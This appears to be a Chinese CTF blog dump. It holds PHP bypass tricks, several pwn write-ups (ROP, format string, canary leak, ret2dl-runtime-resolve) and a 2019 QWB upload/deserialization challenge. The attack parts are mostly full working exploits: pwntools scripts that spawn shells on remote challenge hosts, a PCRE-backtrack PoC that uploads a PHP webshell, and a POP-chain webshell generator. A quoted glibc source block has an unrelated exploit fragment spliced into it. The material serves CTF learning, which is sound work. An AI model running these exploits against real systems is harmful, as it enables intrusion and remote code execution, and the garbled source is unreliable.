如果用.进行任意字符匹配可以用%0a换行符绕过\n\n\n正则表达式的字符类\n\n[:alpht:]匹配所有的字母;[:upper:]匹配所有的大写字母;[:lower:]匹配所有的小写字母;[:digit:]匹配所有数字;[:alnum:]匹配所有数字、字母;[:xdigit:]匹配任何十六进制数字;[:space:]匹配制表符，换行符，垂直制表符，换页，回车或空格;[:blank:]匹配空格或制表符;[:print:]匹配任何可打印的字符;[:punct:]匹配任何标点符号;[:graph:]匹配任何可打印但是除了空格类字符那些;[:word:]匹配字母数字字符和下划线的连续字符串;[:ascii:]匹配ascii码为0-127的字符;[:cntrl:]不属于字符类的任何字符:[:upper:],[:lower:],[:alpha:],[:digit:],[:punct:],[:graph:],[:print:],[:xdigit:];\n\n\n绕过一些关键词popen\n\n若是tail cat被过滤可用tacphp命令执行的代码passthru()函数localeconv()这个函数在不传递参数的情况下是返回&#x27;.&#x27;但是数据类型为数组,使用current()可以读取.&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;这样的正则表达式可以通过的为a(b(c()))一直套娃下去都可以通过strcpm绕过:\t数组的返回值会报错md5绕过(弱类型):\ts1502113478a    0e861580163291561247404381396064    s1885207154a    0e509367213418206700842008763514    s1836677006a    0e481036490867661113260034900752    s155964671a    0e342768416822451524974117254469    s1184209335a    0e072485820392773389523109082030\n\n\nphp原生类\n\n操作文件的原生类\n$test=new SplFileObject(filename,mode=&quot;r&quot;);var_dump($test-&gt;fpassthru());可以读取文件\n\n\nintval函数\n\nphp5    intval(&#x27;1e10&#x27;)--&gt;1    intval(&#x27;1e10&#x27;+1)--&gt;10000000php7行不通\n\n\nmt_rand()伪随机漏洞\n\n对于php的mt_rand产生的随机数实际上是受mt_srand种子(seed)所影响的\n\n会产生这样存在线性关系的随机数，可以同通过脚本暴力破解\na = &#x27;2BnGu1TiNa&#x27;b = &#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;res = &#x27;&#x27;# print(len(b))for i in range(len(a)):    for j in range(len(b)):        if a[i] == b[j]:            res += str(j)+&#x27; &#x27;+str(j)+&#x27; 0 &#x27;+str(len(b))+&#x27; &#x27;            breakprint(res)#得到每个字符位于的位置，然后通过这种傻逼的组合方式\n\n随后通过php_mt_seed爆出seed\n$ ./php_mt_seed 28 28 0 61 37 37 0 61 13 13 0 61 42 42 0 61 20 20 0 61 27 27 0 61 55 55 0 61 8 8 0 61 49 49 0 61 0 0 0 61Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62Version: 3.0.7 to 5.2.0Found 0, trying 0xfc000000 - 0xffffffff, speed 1142.7 Mseeds/s Version: 5.2.1+Found 0, trying 0x0a000000 - 0x0bffffff, speed 108.9 Mseeds/s seed = 0x0a552021 = 173350945 (PHP 7.1.0+)Found 1, trying 0xfe000000 - 0xffffffff, speed 102.6 Mseeds/s Found 1\n\n得到seed之后再用php就可以跑出来了\n&lt;?php$x = 12;mt_srand(173350945);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str = &#x27;&#x27;;$len1 = 20;for ($i = 0; $i &lt; $len1; $i++) &#123;    $str .= substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);&#125;echo $str;\n\n\n PHP利用PCRE回溯次数限制绕过某些安全限制\n\n&lt;?phpfunction is_php($data)&#123;      return preg_match(&#x27;/&lt;\\?.*[(`;?&gt;].*/is&#x27;, $data);  &#125;if(!is_php($input)) &#123;    fwrite($f, $input); ...&#125;在is_php为false的时候可以写入webshell\n\n在正则函数匹配的时候会进行以下操作\n\n官方给出的回溯上限为1000000次，若是超出这个次数就会返回false\n所以可以给出对应的poc\nimport requestsfiles = &#123;  &#x27;file&#x27;: (&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27; + &#x27;a&#x27; * 1000000)&#125;res = requests.post(&#x27;http://51.158.75.42:8088/index.php&#x27;, files=files, allow_redirects=False)print(res.headers)\n\n\n一些trick小技巧\n\n这类情况;if (preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $func) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i&#x27;, $arg))&#123;    dir(&#x27;nonono!&#x27;);&#125;else&#123;    //There is no code to print flag in flag.php    $func(&#x27;&#x27;, $arg);&#125;// $func和$arg可控的话// $func = create_function// $arg = ;&#125; include(base64_decode(ZmxhZy5waHA=));var_dump(get_defined_vars());/*   就可以绕过了\n\n","categories":["web"],"tags":["php"]},{"title":"pwn-100","url":"/2021/09/20/pwn-100/","content":"获取程序信息\n是六十四位程序，小端序，没有开起栈溢出保护\n反编译分析程序程序源码:\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  sub_40068E();  return 0LL;&#125;\n\nint sub_40068E()&#123;  char v1; // [rsp+0h] [rbp-40h]  sub_40063D((__int64)&amp;v1, 200);  return puts(&quot;bye~&quot;);&#125;\n\n__int64 __fastcall sub_40063D(__int64 a1, signed int a2)&#123;  __int64 result; // rax  unsigned int i; // [rsp+1Ch] [rbp-4h]  for ( i = 0; ; ++i )  &#123;    result = i;    if ( (signed int)i &gt;= a2 )      break;    read(0, (void *)((signed int)i + a1), 1uLL);  &#125;  return result;&#125;\n\n在ida pro里面没找到system函数，也没找到”/bin/sh”字符串。所以就该开始构造ROP\n64位的程序在进行ROP与32不一样，64位的参数放在寄存器(我好像上一篇提到过)，使用ROPgadegt\n\n找到符合要求的汇编指令，后续就直接开始pwn它\ngetshellexp脚本\nfrom pwn import *from LibcSearcher import *context(os=&#x27;Linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./questions/bee9f73f50d2487e911da791273ae5a3&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 53172)plt_puts_addr = elf.plt[&#x27;puts&#x27;]got_puts_addr = elf.got[&#x27;puts&#x27;]pop_rdi_ret_addr = 0x0000000000400763main_addr = 0x4006b8payload = b&#x27;a&#x27; * (0x40 + 0x08) + p64(pop_rdi_ret_addr) + \\    p64(got_puts_addr) + p64(plt_puts_addr) + p64(main_addr)payload = payload.ljust(200, b&#x27;a&#x27;)r.send(payload)print(r.recvline())real_puts_addr = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\0&#x27;))libc = LibcSearcher(&#x27;puts&#x27;, real_puts_addr)libc_system_addr = libc.dump(&#x27;system&#x27;)libc_shell_addr = libc.dump(&#x27;str_bin_sh&#x27;)libc_puts_addr = libc.dump(&#x27;puts&#x27;)offset = real_puts_addr - libc_puts_addrreal_system_addr = offset + libc_system_addrreal_shell_addr = offset + libc_shell_addrpayload = b&#x27;a&#x27; * (0x40 + 0x08) + p64(pop_rdi_ret_addr) + \\    p64(real_shell_addr) + p64(real_system_addr)payload = payload.ljust(200, b&#x27;a&#x27;)r.send(payload)r.interactive()\n\n\n\n\n\n今天的比赛属实搞人心态，那个pwn的题目一直存在栈未对齐，是我太菜了分析不到原因，等等明天的wp吧。\n","categories":["pwn-xctf"],"tags":["pwn","ROP"]},{"title":"pwn-200","url":"/2021/10/26/pwn-200/","content":"检查保护\n32位，没开canary和PIE\n利用过程int __cdecl main()&#123;  char buf[108]; // [esp+2Ch] [ebp-6Ch] BYREF  strcpy(buf, &quot;Welcome to XDCTF2015~!\\n&quot;);  memset(&amp;buf[24], 0, 0x4Cu);  setbuf(stdout, buf);  write(1, buf, strlen(buf));  sub_8048484();  return 0;&#125;ssize_t sub_8048484()&#123;  char buf[108]; // [esp+1Ch] [ebp-6Ch] BYREF  setbuf(stdin, buf);  return read(0, buf, 0x100u);&#125;\n\n很明显的栈溢出，但是没有直接可以用的system和/bin/sh所以构造rop，这个题跟以往的很烦的一点就是，他的libc文件我用LibcSearcher就是找不到，在找不到的情况下，使用pwntools提供的DynELF来getshell，但是这个好像不能找到字符串所以下面是把字符串写到bss段当中然后执行system就行\nexpfrom pwn import *# r = remote(&#x27;111.200.241.244&#x27;, 51421)r = process(&#x27;./questions/bed0c68697f74e649f3e1c64ff7838b8&#x27;)elf = ELF(&#x27;./questions/bed0c68697f74e649f3e1c64ff7838b8&#x27;)write_plt = elf.plt[&#x27;write&#x27;]read_plt = elf.plt[&#x27;read&#x27;]bss_addr = elf.bss()padding = (0x6c+4)*b&#x27;a&#x27;main_addr = 0x080484BEppp_addr = 0x080485cddef leak(address):    payload = padding+p32(write_plt)+p32(main_addr)+p32(1)+p32(address)+p32(4)    r.sendafter(b&quot;Welcome to XDCTF2015~!\\n&quot;, payload)    return r.recv(4)d = DynELF(leak, elf=elf)sys_addr = d.lookup(b&#x27;system&#x27;, &#x27;libc&#x27;)payload = padding+p32(read_plt)+p32(sys_addr)+p32(0)+p32(bss_addr)+p32(8)r.sendafter(b&quot;Welcome to XDCTF2015~!\\n&quot;, payload)r.send(b&quot;/bin/sh\\x00&quot;)r.interactive()\n","categories":["pwn-xctf"],"tags":["stack overflow"]},{"title":"pwn_实时数据监测","url":"/2021/09/23/pwn-%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/","content":"程序保护和流程\n啥都没开\n反汇编代码int __cdecl main(int argc, const char **argv, const char **envp)&#123;  locker();  return 0;&#125;\n\nint locker()&#123;  int result; // eax  char s; // [esp+0h] [ebp-208h]  fgets(&amp;s, 0x200, stdin);  imagemagic(&amp;s);  if ( key == 35795746 )    result = system(&quot;/bin/sh&quot;);  else    result = printf(format, &amp;key, key);  return result;&#125;\n\nint __cdecl imagemagic(char *format)&#123;  return printf(format);&#125;\n\n看程序栈 fgets 达不到栈溢出的要求，然后调用了 imagemagic 的函数其实就是调用 printf，第一反应就是格式化字符串漏洞(我中途想着想着就想到栈迁移劫持程序流，我是傻逼)\n然后就是要是 key==35795746 的话就可以 getshell 了。key 是 bss 段上的全局变量会在不等于的时候打印出地址和值\n\n利用过程首先使用\npayload=b&#x27;aaaa_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p&#x27;\n\n\n得出偏移量为 12，但是要是直接搞进去的话程序直接崩溃了。\n解法一按照字节写入\npayload = p32(key_addr)+p32(key_addr+1)+p32(key_addr+2) + \\    p32(key_addr+3)+b&quot;%18c%12$hhn%17c%13$hhn%239c%14$hhn%224c%15$hhn&quot;\n\n所以写入的字节就是\n\n18+4*4=34=0x22 17+34=51=0x33 239+51=290=0x122 224+290=514=0x202\n所以在内存的存储就是\n22 33 22 02\n合并起来就是 0x02223322\n\n解法二直接使用 pwntools 的函数 fmtstr_payload\n最终 exp\nfrom pwn import *context(os=&#x27;Linux&#x27;, arch=&#x27;x86&#x27;, log_level=&#x27;DEBUG&#x27;)elf = ELF(&#x27;./questions/9926c1a194794984978011fc619e3301&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 64783)# r = process(&#x27;./questions/9926c1a194794984978011fc619e3301&#x27;)key_addr = 0x0804a048key_value = 0x02223322# payload = fmtstr_payload(12, &#123;key_addr: key_value&#125;)payload = p32(key_addr)+p32(key_addr+1)+p32(key_addr+2) + \\    p32(key_addr+3)+b&quot;%18c%12$hhn%17c%13$hhn%239c%14$hhn%224c%15$hhn&quot;r.sendline(payload)r.interactive()\n","categories":["pwn-xctf"],"tags":["格式化字符串"]},{"title":"pwn1_sctf_2016","url":"/2021/09/19/pwn1-sctf-2016/","content":"获取程序信息\nNX被打开，没有canary保护栈。\n\n调用一下是这样子的\nIDA静态分析\nmain函数执行了vuln然后看到有get_flag，应该就是在vuln发生栈溢出然后调用get_flag。\nvuln函数的内容:\nint vuln()&#123;  const char *v0; // eax  char s; // [esp+1Ch] [ebp-3Ch]  char v3; // [esp+3Ch] [ebp-1Ch]  char v4; // [esp+40h] [ebp-18h]  char v5; // [esp+47h] [ebp-11h]  char v6; // [esp+48h] [ebp-10h]  char v7; // [esp+4Fh] [ebp-9h]  printf(&quot;Tell me something about yourself: &quot;);  fgets(&amp;s, 32, edata);  std::string::operator=(&amp;input, &amp;s);  std::allocator&lt;char&gt;::allocator(&amp;v5);  std::string::string(&amp;v4, &quot;you&quot;, &amp;v5);  std::allocator&lt;char&gt;::allocator(&amp;v7);  std::string::string(&amp;v6, &quot;I&quot;, &amp;v7);  replace((std::string *)&amp;v3);  std::string::operator=(&amp;input, &amp;v3, &amp;v6, &amp;v4);  std::string::~string((std::string *)&amp;v3);  std::string::~string((std::string *)&amp;v6);  std::allocator&lt;char&gt;::~allocator(&amp;v7);  std::string::~string((std::string *)&amp;v4);  std::allocator&lt;char&gt;::~allocator(&amp;v5);  v0 = (const char *)std::string::c_str((std::string *)&amp;input);  strcpy(&amp;s, v0);  return printf(&quot;So, %s\\n&quot;, &amp;s);&#125;\n\n发现看不懂，完全不知道啥意思，但是可以看到，&amp;s只允许输入32字节的长度，但是栈的情况\ngdb动态分析\n偏移量是64字节，所以无论怎样都无法溢出，然后看见有一个”I”和一个”you”。作为web出生的选手一下子就想到了反序列化因为替换字符导致绕过，这里估计也是一样，然后gdb调式验证一下。\n\n在这里输入五个”I”\n\n可以看到printf答应出来的都是’youyouyouyouyou’了，在栈上也是一样的，变成了五个”you”，从一个字节变到三个字节，找到栈溢出了。\nget_flagexp.py\nfrom pwn import *context(os=&#x27;Linux&#x27;, arch=&#x27;x86&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./questions/pwn1_sctf_2016&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 29915)flag_addr = elf.symbols[&#x27;get_flag&#x27;]payload = b&#x27;I&#x27;*(21)+b&#x27;a&#x27; + p32(flag_addr)# r.recvuntil(&#x27;Tell me something about yourself:&#x27;)r.sendline(payload)r.interactive()\n\n","categories":["pwn-buuctf"],"tags":["stack overflow"]},{"title":"pwn1","url":"/2021/10/27/pwn1/","content":"保护检查\n开启了canary\n执行流程__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  int v3; // eax  char s[136]; // [rsp+10h] [rbp-90h] BYREF  unsigned __int64 v6; // [rsp+98h] [rbp-8h]  v6 = __readfsqword(0x28u);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  memset(s, 0, 0x80uLL);  while ( 1 )  &#123;    sub_4008B9();    v3 = sub_400841();    switch ( v3 )    &#123;      case 2:        puts(s);        break;      case 3:        return 0LL;      case 1:        read(0, s, 0x100uLL);        break;      default:        sub_400826(&quot;invalid choice&quot;);        break;    &#125;    sub_400826(&amp;unk_400AE7);  &#125;&#125;\n\n就是选择然后执行相应的内容，很明显在选择1的时候存在栈溢出，但是puts是遇到”\\0”时停止输出，所以可以利用puts泄漏出canary然后栈溢出。思路很简单直接给exp\nfrom pwn import *from LibcSearcher import *elf = ELF(&quot;./questions/babystack&quot;)r = remote(&#x27;111.200.241.244&#x27;, 56538)payload = b&#x27;a&#x27;*(0x90-0x8)pop_rdi_addr = 0x0000000000400a93puts_plt_addr = elf.plt[&#x27;puts&#x27;]puts_got_addr = elf.got[&#x27;puts&#x27;]main_addr = 0x0000000000400908r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;1&#x27;)r.sendline(payload)r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;2&#x27;)# print(r.recvuntil(b&#x27;aaaaaaaa\\n&#x27;))r.recvuntil(b&#x27;aaaaaaaa\\n&#x27;)# print((r.recvuntil(b&#x27;\\n&#x27;).ljust(8, b&#x27;\\0&#x27;)))# print(u64(r.recv(7).ljust(8, b&#x27;\\0&#x27;)))canary = u64(r.recv(7).rjust(8, b&#x27;\\0&#x27;))payload += p64(canary)+b&#x27;a&#x27;*0x8+p64(pop_rdi_addr)+p64(puts_got_addr) + \\    p64(puts_plt_addr)+p64(main_addr)r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;1&#x27;)r.sendline(payload)r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;3&#x27;)# print(u64(r.recvline()[:-1].ljust(8, b&#x27;\\0&#x27;)))real_puts_addr = u64(r.recvline()[:-1].ljust(8, b&#x27;\\0&#x27;))libc = LibcSearcher(&#x27;puts&#x27;, real_puts_addr)offset = real_puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc.dump(&#x27;system&#x27;)+offsetbin_sh_addr = libc.dump(&#x27;str_bin_sh&#x27;)+offsetpayload = b&#x27;a&#x27;*(0x90-0x8)+p64(canary)+b&#x27;a&#x27;*0x8 + \\    p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr)r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;1&#x27;)r.sendline(payload)r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;3&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["canary"]},{"title":"强网杯_2019_Upload","url":"/2021/09/24/qwb-2019-Upload/","content":"获取题目信息点是题目是登录注册窗口，随便注册进入，发现里面是一个上传文件页面，上传之后，就会进入到假想的聊天页面，观察url地址都是index.php/home这种类型的一般来说就是thinkphp了，然后找不到东西了，就开始扫。\n\n扫出来两个敏感信息，robots.txt里面什么都没有，www.tar.gz直接源码泄漏开始代码审计。\n分析源码查看了几个控制器，在Profile控制器找到了漏洞。\npublic function upload_img()&#123;    if($this-&gt;checker)&#123;        if(!$this-&gt;checker-&gt;login_check())&#123;            $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/index&quot;;            $this-&gt;redirect($curr_url,302);            exit();        &#125;    &#125;    if(!empty($_FILES))&#123;        $this-&gt;filename_tmp=$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];        $this-&gt;filename=md5($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]).&quot;.png&quot;;        $this-&gt;ext_check();    &#125;    if($this-&gt;ext) &#123;        if(getimagesize($this-&gt;filename_tmp)) &#123;            @copy($this-&gt;filename_tmp, $this-&gt;filename);             // 在这里会将前一个文件复制到后一个文件，那么我们只需要上传一个图片马，然后将图片马的数据随便新建一个php文件就可以getshell了            @unlink($this-&gt;filename_tmp);            $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;            $this-&gt;update_img();        &#125;else&#123;            $this-&gt;error(&#x27;Forbidden type!&#x27;, url(&#x27;../index&#x27;));        &#125;    &#125;else&#123;        $this-&gt;error(&#x27;Unknow file type!&#x27;, url(&#x27;../index&#x27;));    &#125;&#125;\n\n顺着链子往回找，这个Profile类只有两个魔术方法\npublic function __get($name)&#123;    return $this-&gt;except[$name];&#125;public function __call($name, $arguments)&#123;    if($this-&gt;&#123;$name&#125;)&#123;        $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);    &#125;&#125;\n\n我们需要在call调用$this-&gt;upload_img()，也就是要$this-&gt;{$name} === ‘upload_img’。然后这边先不管因为$name我们还不知道从哪里传过来。\n几个控制器当中只有Register控制器存在destruct\npublic function __destruct()&#123;    if(!$this-&gt;registed)&#123;        $this-&gt;checker-&gt;index();    &#125;&#125;\n\n所以现在就可以知道上面的$name就是’index’，该怎么从’index’变到’upload_img’\npublic function __get($name)&#123;    return $this-&gt;except[$name];// 这里给$this-&gt;&#123;$name&#125;赋值，要使得下面的$this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;，那现在后面的键是可控的payload就很好生成了&#125;public function __call($name, $arguments)&#123;    if($this-&gt;&#123;$name&#125;)&#123; // &lt;--这里就是调用 $this-&gt;index但是没有index这个属性，所以进入get        $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);    &#125;&#125;\n\n最终的exp\n&lt;?phpnamespace app\\web\\controller;class Profile&#123;    public $checker;    public $filename_tmp;    public $filename;    public $upload_menu;    public $ext;    public $img;    public $except;    public function __construct()    &#123;        $this-&gt;except = array(&#x27;index&#x27; =&gt; &#x27;img&#x27;);        $this-&gt;img = &#x27;upload_img&#x27;;        $this-&gt;ext = &#x27;png&#x27;;        $this-&gt;filename_tmp = &#x27;../public/upload/b9730141a9b1dc25bccf4fafca028590/107f23d9a1bb68ad9188843933a6065f.png&#x27;;        $this-&gt;filename = &#x27;../public/upload/b9730141a9b1dc25bccf4fafca028590/107f23d9a1bb68ad9188843933a6065f.php&#x27;;    &#125;&#125;class Register&#123;    public $checker;    public $registed;    public function __construct()    &#123;        $this-&gt;registed = false;        $this-&gt;checker = new Profile();    &#125;&#125;echo (base64_encode(serialize(new Register())));\n\n\n上传生成的payload用蚁剑连接，拿到flag\n","categories":["web-buuctf"],"tags":["pop链","upload"]},{"title":"ret2dl-runtime-resolve","url":"/2022/02/03/ret2dl-runtime-resolve/","content":"前段时间因为身体原因摆烂了一周多了，今天又才重新开始做题，报了几场比赛都没能打成就很烦。\nret2dl-runtime-resolve首先ELF文件的引用外部文件的加载方式分为三种FULL_RELRO、PARTIAL_RELRO、NO_RELRO，在后面两种的情况下存在地址延迟加载。\nNO_RELRO\n可以看到在第一次调用read函数的时候，此时会先根据GOT表的位置进行jmp到read@plt+6的位置，然后经过两次push之后到_dl_runtime_resolve函数。\n在源码中dl_runtime_resolve函数只是call了一下_dl_fixup函数。\n#ifndef reloc_offset  # define reloc_offset reloc_arg  # define reloc_index  reloc_arg / sizeof (PLTREL)  #endif  DL_FIXUP_VALUE_TYPE  attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE  _dl_fixup (  # ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS      ELF_MACHINE_RUNTIME_FIXUP_ARGS,  # endif      struct link_map *l, ElfW(Word) reloc_arg) &#123;      //获取symtab（存放dynsym的数组）      const ElfW(Sym) *const symtab          = (const void *) D_PTR (l, l_info[DT_SYMTAB]);      //获取strtab(存放符号名的数组)       const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);      //获取reloc_arg对应的rel.plt项       const PLTREL *const reloc          = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);      //获取reloc_arg对应的dynsym       const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];      const ElfW(Sym) *refsym = sym;      //指向对应的got表，以便将解析结果写回去       void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);      lookup_t result;      DL_FIXUP_VALUE_TYPE value;        /* Sanity check that we&#x27;re really looking at a PLT relocation.  */      assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);        /* Look up the target symbol.  If the normal lookup rules are not        used don&#x27;t look in the global scope.  */      if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) &#123;          const struct r_found_version *version = NULL;            if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL) &#123;              const ElfW(Half) *vernum =                  (const void *) D_PTR (l, l_info[VERSYMID# payload = p64(0)+p64(0x4011DD)+b&#x27;\\x00&#x27;*(0x58-0x10)+p64(fake_dynrel_addr) + \\#     p64(pop_rdi)+p64(bss+0xa0-0x8) +\\#     p64(plt_load)+p64(fake_link_map_addr)+p64(0)# payload = payload.ljust(0xa0-8, b&#x27;\\x00&#x27;)+b&#x27;/bin/sh\\x00&#x27; + \\#     p64(bss+0x58)+p64(leave_ret)# gdb.attach(r)X (DT_VERSYM)]);              ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;              version = &amp;l-&gt;l_versions[ndx];              if (version-&gt;hash == 0)                  version = NULL;          &#125;            /* We need to keep the scope around so do some locking.  This is         not necessary for objects which cannot be unloaded or when          we are not using any threads (yet).  */          int flags = DL_LOOKUP_ADD_DEPENDENCY;          if (!RTLD_SINGLE_THREAD_P) &#123;              THREAD_GSCOPE_SET_FLAG ();              flags |= DL_LOOKUP_GSCOPE_LOCK;          &#125;    #ifdef RTLD_ENABLE_FOREIGN_CALL          RTLD_ENABLE_FOREIGN_CALL;  #endif          //根据符号名,搜索对应的函数，返回libc基地址，并将符号信息保存到sym中           result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,                                        version, ELF_RTYPE_CLASS_PLT, flags, NULL);            /* We are done with the global scope.  */          if (!RTLD_SINGLE_THREAD_P)              THREAD_GSCOPE_RESET_FLAG ();    #ifdef RTLD_FINALIZE_FOREIGN_CALL          RTLD_FINALIZE_FOREIGN_CALL;  #endif            //得到结果           value = DL_FIXUP_MAKE_VALUE (result,                                       sym ? (LOOKUP_VALUE_ADDRESS (result)                                              + sym-&gt;st_value) : 0);      &#125; else &#123;          /* We already found the symbol.  The module (and therefore its load         address) is also known.  */          value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);          result = l;      &#125;        /* And now perhaps the relocation addend.  */      value = elf_machine_plt_value (l, reloc, value);        if (sym != NULL              &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))          value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));        /* Finally, fix up the plt itself.  */      if (__glibc_unlikely (GLRO(dl_bind_not)))          return value;      //将结果写回到got表中       return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);  &#125;  \n\n根据源码内容可以看出来解析时是根据符号名的字符串来解析函数的。\n#include &lt;unistd.h&gt;  #include &lt;string.h&gt;  void fun()&#123;      char buffer[0x20];      read(0,buffer,0x200);  &#125;  int main()&#123;      fun();      return 0;  &#125;  // gcc test.c -z norelro -no-pie -fno-stack-protector -m32 -o ret2dlsolve2  \n\n现在我们创建这样一个漏洞程序。\n在NO_RELRO情况下，因为dynamic可以修改，因此，我们直接修改dynamic的strtab，将它指向我们可控的区域，然后在可控区域对应的位置布置下需要的函数的名字即可，即伪造dynstr。\n\n可以看到上面是有可读可写的权限的。\n\n指向的位置存在这样几个字符串。\nexp如下:\nfrom pwn import *r = process(&#x27;./ret2dlsolve2&#x27;)elf = ELF(&#x27;./ret2dlsolve2&#x27;)pop_ebp = 0x0804848bleave_ret = 0x08048358read_plt = elf.plt[&#x27;read&#x27;]read_plt_load = elf.plt[&#x27;read&#x27;]+6bss = elf.bss()target = 0x804961C+4payload = b&#x27;a&#x27;*(0x28+0x4)+p32(pop_ebp)+p32(bss+0x300) + \\    p32(read_plt)+p32(leave_ret)+p32(0)+p32(bss+0x300)+p32(0x1000)r.sendline(payload)fake_str = b&#x27;\\x00libc.so.6\\x00_IO_stdin_used\\x00system\\x00&#x27;payload = b&#x27;a&#x27;*0x4+p32(read_plt)+p32(read_plt_load) + \\    p32(0)+p32(target)+p32(0x100)payload = payload.ljust(0x50, b&#x27;\\x00&#x27;)+fake_strr.sendline(payload)payload = p32(bss+0x350)+b&#x27;;sh&#x27;r.sendline(payload)r.interactive()\n\n64位相较于32位比较类似，又因为参数是在寄存器内保存的所以，直接一次ROP即可解决。\nPARTIAL_RELRO首先再更深层次的观察_dl_runtime_resolve函数的作用。\n\n这一步和上面一样，但是上面没有提到这两个push的作用，先继续往后看。\n\n上面的0是reloc_arg，下面的0xf7ffd918则是link_map的地址。\n\n通过这个地址即可找到.dynamic的地址，也就是上图中的第三个\n\n.dynamic：是ld.so使用的动态链接信息，在/etc/ld.so.conf文件中存放着需要动态加载的目录，使用ldconfig就可以将ld.so.conf中的指定目录的库文件加载到内存中，并记录在/etc/ld.so.cache文件中。ld.so.1文件就可以在高速缓存中访问动态库文件，提高访问速度。导入动态链接库，可以在/etc/ld.so.conf文件中配置，或者使用LD_LIBRARY_PATH环境变量进行引用。\n\n再根据.dynamic的地址找到另外几个结构的地址\n\n其中的地址信息是:\n.dynstr 的地址是 .dynamic + 0x44 -&gt; 0x0804821c\n\n.dynstr：动态链接的字符串表，保存动态链接所需的字符串。比如符号表中的每个符号都有一个 st_name(符号名)，他是指向字符串表的索引，这个字符串表可能就保存在 .dynstr，而.dynstr结构为正常的字符串数组。\n\n.dynsym 的地址是 .dynamic + 0x4c -&gt; 0x080481cc\n\n.dynsym：动态链接的符号表，保存需要动态连接的符号表，而.dynsym结构如下\n\ntypedef struct&#123;  Elf32_Word    st_name; //符号名相对.dynstr起始的偏移    Elf32_Addr    st_value;  Elf32_Word    st_size;  unsigned char st_info;  unsigned char st_other;  Elf32_Section st_shndx;&#125;Elf32_Sym; \n\n.rel.plt 的地址是 .dynamic + 0x84 -&gt; 0x08048298\n\n.rel.plt：节的每个表项对应了所有外部过程调用符号的重定位信息。而.rel.plt结构如下\n\ntypedef struct&#123;  Elf32_Addr r_offset;//指向GOT表的指针，即该函数在got表的偏移  Elf32_Word r_info;&#125;Elf32_Rel\n\n.rel.plt 的地址加上参数 reloc_arg，即 0x08048298 + 0 -&gt; 0x08048298\n找到的就是函数的重定位表项 Elf32_Rel 的指针，记作 